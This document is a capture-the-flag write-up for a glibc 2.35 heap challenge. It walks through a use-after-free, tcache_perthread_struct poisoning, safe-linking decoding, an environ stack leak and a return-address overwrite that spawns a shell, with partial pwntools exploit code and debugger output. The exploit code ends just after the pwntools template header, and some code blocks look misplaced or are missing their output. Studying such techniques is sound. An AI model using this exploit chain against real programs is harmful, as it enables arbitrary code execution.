This is the first time when I have developed a heap exploitation on tcache. Even though a huge number of guys have agreed the difficulty in heap exploitation, I feel things are becoming way easier only if one has a solid understanding of heap and masters debugging. Not only does this post explains a solution, but also uncovers the pains that I went through while developing an exploit script. The [attachment]({{ site.baseurl }}/assets/binary/2024-07-06-ciscn-2024-my-heap/attachment.zip) could be downloaded here.

## Resolving the application logic
### Reversing the given binary and checking the version of libc

What one needs to do first is to reverse engineer the application logic of the given binary, and check the version of libc in order to tell available exploitation techniques from already patches vulnerabilities in old libc distributions. Load this binary into Ghidra. We could find that its logic is very typical because there are five functions, including add, delete, edit, and show. However, A function located at 0x101495 catches my attention, which I name as `print_shell_addr` in Ghidra, and it plays a big role in poisoning heap. Its decompiled code looks like the following:

```c
void print_shell_addr(void)
{
  printf("magic address: %p\n",get_shell);
  printf("edit data:");
  read(0,ptr_chunk,0x10);
  return;
}
void get_shell(void)
{
  system("/bin/sh");
  return;
}
```

Here, it is clear that the challenge designer would like us to store the address of get_shell somewhere else, and attempt to get it executed. Before we dive into auditing other basic functions, we need to check out the version of the given libc binary. As the preceeding result shown, the version is 2.35.

```bash
$ strings libc.so.6 | grep "ubuntu"
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.7) stable release version 2.35.
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

### Auditing 

Take a look at `menu`:
```
void menu(void)
{
  puts("magic heap has 4 choice : \nadd\ndelete\nshow\nedit");
  return;
}
```

Then turn to `add`:
```c
void add(void)
{
  int iVar1;
  
  puts("which one you choose?");
  iVar1 = choice();
  if (iVar1 == 1) {
    printf("size:");
    iVar1 = choice();
    ptr_chunk = (undefined *)malloc((long)iVar1);
  }
  else {
    malloc(0x4f0);
  }
  return;
}
```

This function allows users to allocate a chunk of specified size, and stores its pointer in a global variable `ptr_chunk`. Furthermore, I had no idea about the reason why `malloc(0x4f0);` serving non-one choices, has been put here while checking it firstly. However, this is very crucial and I will cover in later sections.

`delete` is easy to be understood:
```c
void del(void)
{
  free(ptr_chunk);
  puts("delete success!");
  return;
}
```

The `show` function does not print the content in the allocated buffer straightaway, but actually encodes it first then prints the encoded content. Nontheless, it is quite easy to decode and I will cover the decode algorithm in later sections when necessary.
```c
void show(void)
{
  long in_FS_OFFSET;
  uint data;
  int idx;
  if (ptr_chunk != (undefined *)0x0) {
    printf("the data:");
    for (idx = 0; idx < 7; idx = idx + 1) {
      data = idx + 0x99U ^ (int)(char)ptr_chunk[idx];
      write(1,&data,1);
    }
  }
  return;
}
```


Finally, check `edit`:
```
void edit(void)
{
  printf("edit data:");
  read(0,ptr_chunk,8);
  return;
}
```

It is worth to mention that only first 8 bytes are allowed to modify. 

### Vulnerabilities

As far as I audit in the previous section, there is a relatively obvious vulnerability - use after free (UAF) and double free. In other words, one could allocate a heap buffer then modify its first 8 bytes after freeing the buffer. Moreover, this version of libc has enabled tcache to facilitate heap management in each thread without a need of mixing allocated chunks of other threads at the same management namespace.

Allocate a chunk of size 24 bytes, then free it:
```
magic heap has 4 choice : 
add
delete
show
edit
1
which one you choose?
1
size:24
magic heap has 4 choice : 
add
delete
show
edit
2
delete success!

fastbins
empty
unsortedbin
empty
smallbins

largebins
empty
```

It could be seen in a way that our previously allocated chunk has been placed into a bin of size 0x20 in tcache. Furthermore, being able to modify first 16 bytes in a freed chunk allows us to accomplish double free on tcache.

By referring to another [write-up](https://bbs.kanxue.com/thread-282156.htm), the author claimed there are many approaches to exploit in libc 2.35 and only achieved exploitation by overwriting a return address at the stack to intercept control flow to get a shell. This post will also use the same approach with a slightly different implementation.

## Uncovering tcache and tcache_perthread_struct

What does it look like when we free a tcache chunk? 

```
typedef struct tcache_entry
{
  struct tcache_entry *next;
  struct tcache_perthread_struct *key;
} tcache_entry;
```

As the above structure shown, a freed tcacahe chunk is stored in an entry of specific size, which consists of a pointer to the next freed chunk and a key for checking double free and throwing an exception. Hence, we can see that tcache is implemented as a singly-linked list, and an entry of each bin will maintain its own list once a freed chunk has been placed into that bin.

Furthermore, each entry is managed by a higher level structure, called tcache_perthread_struct. It maintains a record of available chunk for all bins and their corresponding pointers.

For simplicity, I refer to the [slide](https://docs.google.com/presentation/d/13NbUlNvj1Rm-Cc_E_Crp678c-mgzCi0BYfzXIzFB3zI/edit#slide=id.ga6f447a644_0_0) made by Yan in his pwn colleage course to demonstrate this structure:

![Image alt]({{ site.baseurl }}/assets/binary/2024-07-06-ciscn-2024-my-heap/tcacahe_perthread_struct.png "tcache_perthread_struct and tcache_entry")

For example, the entry of size 16 bytes now maintains two freed chunks in its list and the record of count is shown as 2 accordingly.

Turning to tcache_perthread_struct, this is very important for exploitation. It structure is taken from [source code](https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#tcache_entry):
```
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

Notably, the type of count record is uint16_t, which we will overwrite this value in our exploit.

There are more basics than we see here. I am going to present them when necessary as this makes a stronger storytelling.


## Leaking essential addresses

Typically, whenever we deal with heap challenges, the very first step is to leak information we need. In this case, it should be heap base address, from which we could overwrite tcache_perthread_struct, and libc base address, from which we could identify where stack lives in by accessing `environ` variable.

### Leaking heap

Leaking heap base address is way easier that we just need to free an allocated tcache chunk.
```
pwndbg> x/10xg 0x55555555b2a0
0x55555555b2a0:	0x000000055555555b	0xf91a1fa7a1b5da87
pwndbg> vmmap heap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
►   0x55555555b000     0x55555557c000 rw-p    21000      0 [heap]
    0x7ffff7d8f000     0x7ffff7d92000 rw-p     3000      0 [anon_7ffff7d8f]
```

Here, the heap base address stored in a freed chunk is right shifted by 12 bits. Let us take a look at its source code and understand why this address is placed that way:
```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;
  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

As shown above, `e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);` is supposed to set up next pointer while freeing the current chunk. Moreover, the address of `e->next` is landing within heap, which is probably 0x55555555bxxx in this case. However, `tcache->entries[tc_idx]` is null as it just has been initialized. `PROTECT_PTR` is used for safe-linking to check double free. It masks the "next" pointers of the lists' chunks and perform allocation alignment checks on them.
```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```

Hence, the above next pointer is finally calculated as `PROTECT_PTR(0x55555555bxxx, 0)`, which is `0x000000055555555b`. We could left shift its encoded address to leak this heap base address.



### Leaking libc by unsorted_bin

Leaking libc had blocked my progress for a while since I though tcache will somehow leak this information out. By following this methodology, I looked around [tcache section in CTFWiki](https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#libc-leak) to get an answer. However, what it has written down is not this case because it leaks libc base address by simply flooding an entry in tcache. 

Finally, I understand how `malloc(0x4f0);` in the `add` function plays a role to leak libc. Basically, this program allows us to allocate a chunk of whatever size. If we could free a chunk to **unsorted_bin**, then know where `main_arena` is, which helps us calculate libc base address because there is a fixed offset in between. 

At the very beginning, I actually made a mistake before got the libc address. I directly allocated a chunk of big size, then freed it. I was sort of confused why it had not been placed into **unsorted_bin**. Finally, I figured it out when checking source code:
```c
        /*
          If the chunk borders the current high end of memory,
          consolidate into top
        */
        else {
            size += nextsize;
            set_head(p, size | PREV_INUSE);
            av->top = p;
            check_chunk(av, p);
        }
```

Because of the freed chunk next to top chunk, ptmalloc made memory consolidation for both of them. That is to say, after I freed it, this chunk was returned to top chunk and became a part of it.

Hence, using `malloc(0x4f0);` after allocating a big chunk would stop this consolidation from happening.

    0x7ffff7fae000     0x7ffff7fbd000 rw-p     f000      0 [anon_7ffff7fae]
```

It is worthwhile to mention that `main_arena` is a global variable in libc's data section, so this is why we found this address in libc space rather than heap. 

## Poisoning tcache_pthread_struct

As mentioned previously, `print_shell_addr` offers us a chance to double free a tcache chunk (modify key field). Why do we need to poison tcacahe_pthread_struct, instead of leaking stack then overwriting a function return address?

Double free is an one-time use if one leaks stack at this step. What we aim to do is not just leak stack, but allocate a chunk that starts at a certain function return address, then overwrite its value. Otherwise, one only leaks stack but cannot preceed by any allocation at arbitrary address in stack.

Hence, the primary point to poison `tcache_pthread_struct` is to allow as more chances of double free as possible. 

```

    0x7f918f70b000     0x7f918f70e000 rw-p     3000      0 [anon_7f918f70b]
pwndbg> x/10xg 0x6194fc568000
0x6194fc568000: 0x0000000000000000      0x0000000000000291
0x6194fc568010: 0x0000000200020002      0x0000000000000000
0x6194fc568020: 0x0000000000000000      0x0000000000000000
```
So, it could be seen that the starting address of `tcache_pthread_struct` is `0x6194fc568010`. Its first 8 bytes involves count fields for the bins of size from 0x20 to 0x50. For this challenge, the modification on bins of size 0x30 and 0x40 totally suffices. Therefore, we could perform double free twice.

### Leaking stack by environ

`environ` variable in libc data or bss section stores a pointer to environment variables of a running program. If one has access to this information, then could relocate the stack base a bit easier after printing this pointer. The following python code snippets present a way of leaking `environ` then relocating a return address to be overwritten.

```python
# leak libc
add(2000,1)
add(0,2)
delete()
libc_base = show()
libc_base = (unpack(decrypt(libc_base), 'all', endian='little', sign=False) & ~((1<<12)-1) ) - 0x21a000
success("libc_base: " + hex(libc_base))

environ = libc_base + libc.symbols["environ"]
success("environ: " + hex(environ))

shell_addr = leak_and_double_free(heap_base)
shell_addr = int(shell_addr, 0)
success("shell_addr: " + hex(shell_addr))

# tcache posioning pthreat_struct + 0x10, which is the area storing the count of each bin in size
edit(p64((  (heap_base >> 12)  ^ (heap_base+0x10 )  )))

# allocate the tail chunk pointing to pthread_structure to modify counts, so as to allow the use of next field
add(56, 1)
delete()

# change counts for bins of size from 0x20 to 0x40 after getting the chunk at tcache_perthread_struct
add(24, 1)
add(24, 1)
edit(p64(  0x000200020002 ))

# bin 0x30 is used to leak stack
add(32, 1)
delete()
edit(p64( (heap_base >> 12)  ^ environ ))

add(32, 1)
add(32, 1)
stack_addr = unpack(decrypt(show()), 'all', endian='little', sign=False)
success("environ:" + hex(stack_addr))
```

Whenever one receives information from `show` function, needs to decode it (never mind that I has named it differently in the script lol). The decoding algorithm is demonstrated below:
```python
def decrypt(data):
    decrypted = []
    for i in range(0, 7):
        decrypted.append(data[i] ^ 0x99 + i)
    return bytes(decrypted)
```

After previous steps, one might be able to overwrite a function return address. The address of `environ` minus 0x140 () is a good candidate, pointing to where `choice` function returns to.
```
        00101510 e8 54 fd        CALL       choice
                 ff ff
        00101515 89 45 fc        MOV        dword ptr [RBP + local_c],EAX
```

Let us validate in pwndbg:

```

Well, the offset between `environ` and where `choice` function returns to is indeed 0x140. Now, let us allocate a chunk at this specific address and kill the game!
```python
# activate bin of size 0x40 because 0x20 is not usable at all. If you allocate, the program will crash
add(56,1)
delete()

# experimental step
edit(p64( (heap_base >> 12)  ^ (stack_addr-0x140) ))
add(56, 1)
add(56, 1)
```

Ohh, a crash arises and ptmalloc is going to panic by throwing an unalign error if you do so. 
```
malloc(): unaligned tcache chunk detected
```

What is going wrong? Well, as this error illustrated, the address `0x7ffe1c699648` we allocated was not aligned by 0x10. How could we do then? The solution from another writeup is to manipulate the global variable `ptr_chunk` that stores a pointer to a newly allocated chunk. Moreover, its offset from binary base address is `0x4040`, which is located at bss section of the given binary.
```
ptr_chunk
00104040 00 00 00        addr       00000000
         00 00 00 
         00 00
```


In detail, once one has a control over `ptr_chunk` by allocating a chunk at its address, could overwrite its value to a specific address in stack by calling `edit` function, then invoke `edit` twice to change its value to the address of a shell. Indeed, it is quite challenging to have this solution in mind during the contest.

```python
# make use of the global var in bss section so as to directly manipulate stack without having unaligned tcache alloc error
edit(p64( (heap_base >> 12)  ^ (bin_base + 0x4040 ) ))
add(56,1)
add(56,1)
edit(p64(stack_addr-0x140))
edit(p64(shell_addr))

```

However, our exploit did not succeed and the program crashed because of the instruction `movaps` that does not accept non-aligned value in rsp:
```
0x7c830a7e4973    movaps xmmword ptr [rsp], xmm1
───────────────────────────────────────[ STACK ]───────────────────────────────
00:0000│ rsp 0x7ffeb484b2d8 ◂— 0x7c8300000000
```


This rsp value at this crash moment was carrying forward from shell. The better approach is to skip a push instruction at the beginning of shell.

We could skip five bytes then direct get the program executing from 001012c3. 



## Taking over execution flow

After fixing the above issue, the modified script is in the following:

# $ pwn template my_heap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'my_heap')
context.terminal = ["tmux", "splitw", "-v"]
#context.log_level = 'debug'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
